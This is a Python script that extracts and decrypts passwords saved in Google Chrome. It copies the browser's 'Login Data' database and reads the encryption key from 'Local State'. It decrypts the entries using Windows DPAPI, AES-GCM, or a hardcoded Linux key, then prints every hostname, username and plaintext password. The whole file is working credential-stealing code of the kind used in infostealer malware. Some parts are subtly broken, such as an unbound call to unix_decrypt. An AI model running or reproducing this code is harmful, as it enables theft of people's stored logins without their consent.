import os
import sys
import shutil
import sqlite3
import json, base64

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)

class GetChromePass:
    def __init__(self):
        self.passwordlog = ""
        self.APP_DATA_PATH   = os.environ['LOCALAPPDATA']
        self.DB_PATH         = r'Google\Chrome\User Data\Default\Login Data'
        self.NONCE_BYTE_SIZE = 12

    def start(self):
        _full_path = os.path.join(self.APP_DATA_PATH, self.DB_PATH)
        _temp_path = os.path.join(self.APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path,_temp_path)
        self.show_password(_temp_path)
        return self.passwordlog

    def show_password(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.chrome_decrypt(row[2])
            _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
            self.passwordlog += _info
        conn.close()
        os.remove(db_file)

    def chrome_decrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = self.dpapi_decrypt(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = self.aes_decrypt(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            try:
                return unix_decrypt(encrypted_txt)
            except NotImplementedError:
                return None

    def encrypt(self, cipher, plaintext, nonce):
        cipher.mode = modes.GCM(nonce)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext)
        return (cipher, ciphertext, nonce)

    def decrypt(self, cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    def get_cipher(self, key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher

    def dpapi_decrypt(self, encrypted):
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    def unix_decrypt(self, encrypted):
        if sys.platform.startswith('linux'):
            password = 'peanuts'
            iterations = 1
        else:
            raise NotImplementedError

        from Crypto.Cipher import AES
        from Crypto.Protocol.KDF import PBKDF2

        salt      = 'saltysalt'
        iv        = ' ' * 16
        length    = 16
        key       = PBKDF2(password, salt, length, iterations)
        cipher    = AES.new(key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted[3:])
        return decrypted[:-ord(decrypted[-1])]

    def get_key_from_local_state(self):
        jsn = None
        with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode ="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]

    def aes_decrypt(self, encrypted_txt):
        encoded_key   = self.get_key_from_local_state()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key           = self.dpapi_decrypt(encrypted_key)
        nonce         = encrypted_txt[3:15]
        cipher        = self.get_cipher(key)
        return self.decrypt(cipher, encrypted_txt[15:], nonce)


if __name__=="__main__":
    Main = GetChromePass()
    password = Main.start()
    print(password)



